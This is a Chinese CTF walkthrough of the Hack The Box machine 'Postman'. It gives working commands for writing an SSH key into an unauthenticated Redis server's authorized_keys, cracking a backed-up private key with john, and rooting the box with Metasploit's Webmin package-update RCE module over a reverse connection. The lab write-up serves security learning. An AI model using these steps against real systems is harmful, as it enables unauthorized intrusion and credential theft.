@[TOC](目录)
## HTB - Postman
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200320145552111.png)

## [1]侦察和枚举
### [1.1]开放的端口
- 使用**nmap**扫描并搜集开放端口以及有用的信息
	

```bash
root@kali:~/HTB/Postman# nmap -sC -sV -p- -oA nmap/Postman 10.10.10.160
```
![nmap扫描结果](https://img-blog.csdnimg.cn/2020032015073485.png)
我们可以发现：

	 - 具有已知漏洞的默认SSH端口上的OpenSSH 7.6p1服务器，该漏洞允许枚举用户名
	 - 一个Apache 2.4.29默认的HTTP端口
	 - 6379端口上的Redis 4.0.9服务器
	 - 10000端口上的Webmin 1.910
### [1.2]Web发现
在浏览器搜索框输入靶机的IP的之后，我们发现一个正在建设的静态网站
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200320151814877.png)
### [1.3]Redis
Redis是一个内存中的数据结构，通常用作数据库或者缓存。4.0.9版本存在许多的公共漏洞。客户端**redis-cli**可以用于与服务器通信。该服务不受保护，无需进行身份验证即可访问。

 - 使用**telnet**检查是否没有密码验证 

```bash
root@kali:~/HTB/Postman# telent 10.10.10.1600 6379
```
可以发现并不需要密码验证。
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020032015273911.png#pic_center)
### [1.4]Webmin
Webmin是用于基于Unix的系统的基于Web的系统配置工具。此处使用的版本具有2个带有Metasploit模块的HIGH / CRITICAL漏洞。一个是后门，可用于重置管理员密码。但是，它要求启用密码更改功能，在这里不是这种情况。

## [2]获得访问权限
### [2.1]创建公钥
既然我们知道Redis的工作原理是不要求任何的身份验证，我们可以利用这个漏洞获得访问的权限。但首先我们需要创建一个SSH密钥，这样子我们才能进入机器。

 - 使用**ssh-keygen**创建SSH密钥
 

```bash
root@kali:~/HTB/Postman# ssh-keygen -t rsa
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200320153507156.png)
创建好了之后我们下一步就是准备将 它存储到内存之中。由于内存转储中也将包含垃圾，因此我们在密钥周围使用换行符，并且保存在**foo.txt**中，以便我们更好的守护我们的**SSH密钥**。

- 守护SSH密钥

```bash
root@kali:~/HTB/Postamn# (echo -e "\n\n"; cat keys.pub; echo -e "\n\n") > foo.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200320154031530.png#pic_center)
### [2.2]发布密钥
```bash
root@kali:~/HTB/Postman# redis-cli -h 10.10.10.160 flushall
root@kali:~/HTB/Postman# cat foo.txt | redis-cli -h 10.10.10.160 -p 6379 -x set s-key
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200320154634557.png#pic_center)
当返回的结果为OK的时候，我们就成功的发布了我们的密钥(foo.txt).接下来就是配置了。

### [2.3]获取Redis命令行-将密钥插入到内存之中
我们现在需要将s-key(SSH密钥)存储到 .ssh 文件夹中，以便我们可以远程SSH登录到目标计算机。

- 获取Redis命令行界面

```bash
root@kali:~/HTB/Postman# redis-cli 10.10.10.160 -p 6379
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200320155205146.png#pic_center)

- 查看Redis的工作目录、创建我们用有的权限.ssh内部/var/lib/redis。将名称更改为**authorized_keys**和**save**

```java
10.10.10.160:6379> CONFIG GET dir
10.10.10.160:6379> CONFIG SET dir /var/lib/redis/.ssh
10.10.10.160:6379> CONFIG SET dbfilename "authorized_keys"
10.10.10.160:6379> save
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020032015574579.png)

### [2.4]使用SSH登录获得访问权限
- 登录
```bash
root@kali:~/HTB/Postman# ssh -i keys redis@10.10.10.160 
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200320160056531.png)
## [3]本地侦察和枚举
成功登录到目标机之后，接下来就是寻找一些有用的东西

- 使用**history**查看历史命令
```bash
redis@Postman:~$ history
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200320160816690.png)
我们管理员访问了两个文件，**scan.py**和**id_rsa.bak**，其中一个可能是SSH私钥的备份。**scan.py**是不能通过**Redis**访问权限找到它，但是私钥受到的保护很弱，并且可以被全世界范围给读取到~~所以我们针对**id_rsa.bak**下手。
```bash
redis@Postman:~$ find /-name "id_rsa.bak" -ls
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200320161440608.png#pic_center)
可以发现**id_rsa.bak**文件的所在目录在**/opt/**下。

## [4]特权提升
### [4.1]用户透视
使用**cat**查看**id_rsa.bak**，会发现它是加密的
```bash
redis@Postamn:/opt$ cat id_rsa.bak
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020032016203153.png#pic_center)
将私钥复制粘贴到我们的工作目录上的matt2john，使用john进行破解。

- 破解RSA私钥

```bash
root@kali:~/HTB/Postamn# python ssh2john matt2john > matt2john-pass
root@kali:~/HTB/Postamn# john matt2john --wordlist=/usr/share/wordlists/rockyou.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200320162546267.png)
ssh2john的目录在/usr/share/john/ssh2jon.py
破解了**RSA**知道了密码为“computer2008”,现在可以使用这个密码登录Matt`

```bash
redis@Postamn:~$ su Matt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200320162904489.png#pic_center)
登录之后到**/home/Matt**目录下找到完成Postman的提交密钥。
如果只是为了完成Postman到这边就完成了，下面是获得root的方法。
### [4.2]升级为root
我启动了metasploit并搜索了相关的漏洞利用程序。

- 查找漏洞

```bash
root@kali:~/HTB/Postman# searchsploit webmin 1.910
```
- 进入metasploit控制台进行配置

```bash
root@kali:~/HTB/Postman# msfconsole 
msf5> use exploit/linux/http/webmin_packageup_rce 
msf5 exploit(linux/http/webmin_packageup_rce) > set rhosts 10.10.10.160
msf5 exploit(linux/http/webmin_packageup_rce) > set usename Matt
msf5 exploit(linux/http/webmin_packageup_rce) > set lhost tun0
msf5 exploit(linux/http/webmin_packageup_rce) > set ssl true
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020032016381614.png)
- 运行

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200320164356237.png)
可以看到我们成功的获得了root！
I got Root~!

